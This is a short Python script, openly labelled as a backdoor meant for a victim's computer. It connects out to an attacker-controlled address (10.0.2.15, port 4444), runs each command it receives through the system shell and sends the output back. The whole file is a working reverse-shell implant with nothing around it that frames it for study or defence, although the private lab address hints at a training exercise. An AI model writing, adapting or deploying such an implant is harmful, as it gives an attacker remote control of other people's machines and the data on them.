#! /usr/bin/env python
# NOTICE: this script is intended for the victim's computer.
# Compatibility: Python 3 only.

import socket
import subprocess


class Backdoor:
    def __init__(self, ip_addr, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip_addr, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command_received = self.connection.recv(1024).decode(errors="replace")
            command_result = self.execute_system_command(command_received)
            self.connection.send(command_result)

        self.connection.close()


backdoor = Backdoor("10.0.2.15", 4444)
backdoor.run()
